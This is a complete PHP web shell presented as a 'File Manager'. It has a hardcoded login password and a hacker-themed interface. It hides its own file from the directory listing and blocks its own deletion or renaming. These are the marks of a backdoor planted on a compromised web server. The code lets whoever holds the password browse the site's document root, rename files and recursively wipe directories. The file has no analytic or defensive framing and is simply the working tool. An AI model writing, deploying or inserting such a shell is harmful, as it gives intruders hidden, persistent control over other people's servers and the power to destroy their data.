<?php
session_start();

$PASSWORD = 'odiyan911';
$SHELL_NAME = basename(__FILE__);

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Authentication
if (!isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['authenticated'] = true;
        } else {
            $error = "Incorrect password.";
        }
    }
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8" />
            <title>Access Restricted</title>
            <style>
                body {
                    background: black;
                    color: #0f0;
                    font-family: monospace;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                    flex-direction: column;
                }
                form {
                    background: #002200;
                    padding: 20px;
                    border-radius: 8px;
                    box-shadow: 0 0 15px #0f0;
                }
                input[type="password"] {
                    background: #001100;
                    border: 1px solid #0f0;
                    color: #0f0;
                    font-family: monospace;
                    font-size: 1.2em;
                    padding: 10px;
                    border-radius: 5px;
                    width: 250px;
                    outline: none;
                }
                button {
                    margin-top: 15px;
                    background: #0f0;
                    border: none;
                    color: black;
                    font-weight: bold;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    font-family: monospace;
                    font-size: 1.1em;
                    width: 100%;
                }
                button:hover {
                    background: #0c0;
                }
                .error {
                    color: #f00;
                    margin-top: 15px;
                    font-weight: bold;
                    text-align: center;
                }
            </style>
        </head>
        <body>
            <h1>ACCESS RESTRICTED</h1>
            <form method="POST" autocomplete="off">
                <input type="password" name="password" placeholder="Enter password" autofocus required />
                <button type="submit">ENTER</button>
                <?php if (isset($error)): ?>
                    <div class="error"><?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

// Base directory (document root)
$base_dir = realpath($_SERVER['DOCUMENT_ROOT'] ?? __DIR__);
if ($base_dir === false) {
    $base_dir = realpath(__DIR__);
}

// Current directory relative to base_dir
$rel_path = $_GET['path'] ?? '';
$rel_path = trim($rel_path, '/\\');
$abs_path = realpath($base_dir . DIRECTORY_SEPARATOR . $rel_path);

// Validate path is inside base_dir
if ($abs_path === false || strpos($abs_path, $base_dir) !== 0) {
    $abs_path = $base_dir;
    $rel_path = '';
}

// Handle file operations
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $current_path = $_POST['current_path'] ?? '';
    $current_abs = realpath($base_dir . DIRECTORY_SEPARATOR . $current_path);
    if ($current_abs === false || strpos($current_abs, $base_dir) !== 0) {
        $message = "Invalid directory.";
    } else {
        if ($action === 'delete' && isset($_POST['target'])) {
            $target = basename($_POST['target']);
            if ($target === $SHELL_NAME) {
                $message = "Cannot delete shell file.";
            } else {
                $target_path = $current_abs . DIRECTORY_SEPARATOR . $target;
                if (is_dir($target_path)) {
                    // Recursive delete
                    function rrmdir($dir) {
                        foreach (scandir($dir) as $file) {
                            if ($file === '.' || $file === '..') continue;
                            $path = $dir . DIRECTORY_SEPARATOR . $file;
                            if (is_dir($path)) rrmdir($path);
                            else unlink($path);
                        }
                        rmdir($dir);
                    }
                    rrmdir($target_path);
                    $message = "Directory '$target' deleted.";
                } elseif (is_file($target_path)) {
                    unlink($target_path);
                    $message = "File '$target' deleted.";
                } else {
                    $message = "Target does not exist.";
                }
            }
        } elseif ($action === 'rename' && isset($_POST['target'], $_POST['newname'])) {
            $target = basename($_POST['target']);
            $newname = basename($_POST['newname']);
            if ($target === $SHELL_NAME || $newname === $SHELL_NAME) {
                $message = "Cannot rename shell file.";
            } else {
                $old_path = $current_abs . DIRECTORY_SEPARATOR . $target;
                $new_path = $current_abs . DIRECTORY_SEPARATOR . $newname;
                if (!file_exists($old_path)) {
                    $message = "Target does not exist.";
                } elseif (file_exists($new_path)) {
                    $message = "New name already exists.";
                } else {
                    rename($old_path, $new_path);
                    $message = "Renamed '$target' to '$newname'.";
                }
            }
        }
    }
}

// List files and directories
$items = scandir($abs_path);

function urlPath($base, $path) {
    $rel = ltrim(str_replace($base, '', $path), '/\\');
    return str_replace('\\', '/', $rel);
}

$current_rel = urlPath($base_dir, $abs_path);

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>PHP Shell - File Manager</title>
<style>
    body {
        background: #0f0f0f;
        color: #0f0;
        font-family: monospace;
        margin: 0;
        padding: 0 20px 20px 20px;
    }
    h1 {
        text-shadow: 0 0 5px #0f0;
        margin: 20px 0 10px 0;
    }
    a {
        color: #0f0;
        text-decoration: none;
    }
    a:hover {
        text-decoration: underline;
    }
    ul {
        list-style: none;
        padding-left: 0;
    }
    li {
        padding: 5px 0;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-bottom: 1px solid #003300;
    }
    .name {
        flex-grow: 1;
    }
    .dir {
        font-weight: bold;
        color: #0ff;
        cursor: pointer;
    }
    .actions button {
        background: #003300;
        border: 1px solid #0f0;
        color: #0f0;
        padding: 3px 8px;
        margin-left: 5px;
        cursor: pointer;
        font-family: monospace;
        font-size: 0.9em;
        border-radius: 3px;
    }
    .actions button:hover {
        background: #0f0;
        color: #000;
    }
    .message {
        margin: 10px 0;
        padding: 10px;
        background: #003300;
        border: 1px solid #0f0;
        border-radius: 5px;
    }
    form.rename-form {
        display: inline;
    }
    input.rename-input {
        background: #001100;
        border: 1px solid #0f0;
        color: #0f0;
        font-family: monospace;
        font-size: 1em;
        padding: 2px 5px;
        border-radius: 3px;
        width: 150px;
    }
</style>
<script>
function showRename(id) {
    document.getElementById('rename-display-' + id).style.display = 'none';
    document.getElementById('rename-form-' + id).style.display = 'inline';
    document.getElementById('rename-input-' + id).focus();
}
function cancelRename(id) {
    document.getElementById('rename-form-' + id).style.display = 'none';
    document.getElementById('rename-display-' + id).style.display = 'inline';
}
function confirmDelete(name) {
    return confirm("Are you sure you want to delete '" + name + "'?");
}
</script>
</head>
<body>
<h1>PHP Shell - File Manager</h1>
<div><strong>Current directory:</strong> /<?php echo htmlspecialchars($current_rel); ?></div>
<?php
if ($message !== '') {
    echo '<div class="message">' . htmlspecialchars($message) . '</div>';
}
?>
<ul>
    <?php
    // Show parent directory link if not at base
    if ($abs_path !== $base_dir) {
        $parent_rel = dirname($current_rel);
        echo '<li><a href="?path=' . urlencode($parent_rel) . '">[..]</a></li>';
    }
    $id = 0;
    foreach ($items as $item) {
        if ($item === '.' || $item === $SHELL_NAME) continue;
        if ($item === '..') continue; // handled above
        $item_path = $abs_path . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($item_path);
        $display_name = htmlspecialchars($item);
        echo '<li>';
        echo '<div class="name">';
        if ($is_dir) {
            // Directory name as clickable link
            $link_path = ($current_rel === '') ? $item : $current_rel . '/' . $item;
            echo '<a href="?path=' . urlencode($link_path) . '" class="dir">' . $display_name . '</a>';
        } else {
            echo $display_name;
        }
        echo '</div>';
        echo '<div class="actions">';
        // Rename button and form
        echo '<span id="rename-display-' . $id . '">';
        echo '<button type="button" onclick="showRename(' . $id . ')">Rename</button>';
        echo '</span>';
        echo '<form method="POST" class="rename-form" id="rename-form-' . $id . '" style="display:none;" onsubmit="return this.newname.value.trim() !== \'\';">';
        echo '<input type="hidden" name="action" value="rename" />';
        echo '<input type="hidden" name="target" value="' . htmlspecialchars($item) . '" />';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel) . '" />';
        echo '<input type="text" name="newname" class="rename-input" id="rename-input-' . $id . '" value="' . htmlspecialchars($item) . '" required />';
        echo '<button type="submit">Save</button>';
        echo '<button type="button" onclick="cancelRename(' . $id . ')">Cancel</button>';
        echo '</form>';
        // Delete button with confirmation
        echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete(\'' . addslashes($item) . '\');">';
        echo '<input type="hidden" name="action" value="delete" />';
        echo '<input type="hidden" name="target" value="' . htmlspecialchars($item) . '" />';
        echo '<input type="hidden" name="current_path" value="' . htmlspecialchars($current_rel) . '" />';
        echo '<button type="submit">Delete</button>';
        echo '</form>';
        echo '</div>';
        echo '</li>';
        $id++;
    }
    ?>
</ul>
<div style="margin-top: 20px;">
    <a href="?logout=1" style="color:#f00;">Logout</a>
</div>
</body>
</html>
